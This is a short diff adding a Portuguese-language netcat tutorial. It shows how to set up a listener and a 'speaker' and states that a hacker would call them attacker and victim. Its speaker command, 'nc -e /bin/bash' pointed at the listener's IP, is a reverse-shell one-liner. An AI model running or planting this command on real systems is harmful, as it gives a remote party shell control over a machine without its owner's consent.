@@ -1,0 +1,10 @@
+# Title: how to use netcat
+# Descrição: Criar uma conexão entre um Listener e um Speaker. Atenção: Um hacker iria chamar "Atacado" ao "Speaker" e iria chamar "Atacante" ao "Listener.
+
+# Finding ip adress on Linux Terminal: "hostname -i"
+
+# Configurar um Listener:
+	nc -lvp 87 -s <ip do Speaker> <port>
+
+# Configurar um Speaker:
+	nc -e /bin/bash <ip do Listener> <port>
